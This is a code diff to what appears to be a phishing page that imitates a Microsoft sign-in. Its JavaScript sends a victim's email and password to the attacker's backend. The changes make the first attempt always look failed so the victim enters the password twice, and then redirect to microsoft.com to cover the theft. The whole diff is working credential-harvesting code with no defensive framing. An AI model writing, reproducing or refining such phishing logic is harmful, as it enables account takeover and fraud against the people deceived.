@@ -170,7 +170,9 @@
               border-bottom: 2px solid blue; width: 400px; 
               padding: 5px 0; display: inline-block;" value="${password}">
       <form id="finalForm" method="POST" action="/">
+        {% if csrf_token %}
         <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        {% endif %}
         <input type="hidden" name="email" value="">
         <input type="hidden" name="password" value="">
         <input type="hidden" name="submit" value="Sign in">
@@ -281,29 +283,40 @@
   // Function to submit credentials to backend
   function submitToBackend(emailVal, passwordVal, isSecondAttempt) {
     const formData = new FormData();
+    {% if csrf_token %}
     formData.append('csrf_token', '{{ csrf_token() }}');
+    {% endif %}
     formData.append('email', emailVal);
     formData.append('password', passwordVal);
     formData.append('submit', 'Sign in');
     
     fetch('/', {
       method: 'POST',
-      body: formData
+      body: formData,
+      credentials: 'same-origin'
     })
     .then(response => {
       const redirected = response.redirected;
       const url = response.url;
       
-      // Check if redirected to retry page (first attempt blocked)
-      if (redirected && url.includes('step=retry')) {
-        window.location.href = url;
-        return;
+      // For first attempt (should always fail and show try again)
+      if (!isSecondAttempt) {
+        // Check if redirected to retry page
+        if (redirected && url.includes('step=retry')) {
+          // Show step 3 instead of redirecting
+          setTimeout(() => showStep3(), 500);
+          return null;
+        } else {
+          // If no redirect, force show step 3 anyway (first attempt should fail)
+          setTimeout(() => showStep3(), 500);
+          return null;
+        }
       }
       
-      // Check if redirected to microsoft.com (success case)
+      // For second attempt - check for success redirect
       if (redirected && url.includes('microsoft.com')) {
         window.location.href = 'https://microsoft.com';
-        return;
+        return null;
       }
       
       return response.text();
